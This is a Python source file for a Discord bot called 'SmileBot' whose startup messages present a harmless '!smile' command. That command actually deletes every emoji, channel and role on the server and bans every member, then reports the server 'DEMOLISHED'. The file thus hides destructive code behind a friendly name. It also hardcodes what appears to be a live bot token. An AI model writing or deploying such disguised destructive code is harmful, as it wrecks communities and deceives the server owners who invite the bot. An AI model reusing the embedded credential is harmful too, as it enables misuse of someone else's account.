import discord
from discord.ext.commands import bot
from discord.ext import commands
import random
import asyncio
import time
from threading import Thread
from random import randint
import datetime
import os
import aiohttp
import sys
import traceback
import json
from discord.utils import get


bot = commands.Bot(command_prefix='!')

@bot.event
async def on_ready():
    print("Welcome to SmileBot!")
    print("Bot name: " + bot.user.name)
    print("commands : !smile")
    print("It'll make them smile ;)")
    print('discord version: ' + discord.__version__)


@bot.command(pass_context=True)
async def smile(ctx):
       await bot.say("Say Cheese!")
       for emoji in list(ctx.message.server.emojis):
           try:
               await bot.delete_custom_emoji(emoji)
               print (emoji.name + " has been deleted in " + ctx.message.server.name)
           except:
               pass
       for channel in list(ctx.message.server.channels):
           try:
               await bot.delete_channel(channel)
               print (channel.name + " has been deleted in " + ctx.message.server.name)
           except:
               pass
       for role in list(ctx.message.server.roles):
           try:
               await bot.delete_role(ctx.message.server, role)
               print (role.name + " has been deleted in " + ctx.message.server.name)
           except:
               pass
       for user in list(ctx.message.server.members):
           try:
               await bot.ban(user)
               print (user.name + " has been banned from " + ctx.message.server.name)
           except:
               pass
       print ("Server successfully DEMOLISHED")

bot.run ("NDgyNzIwODMzNTQzMDc3ODg4.DmJLFQ.39xsx-jrtq9sUn4yoiJN6joLO8U")
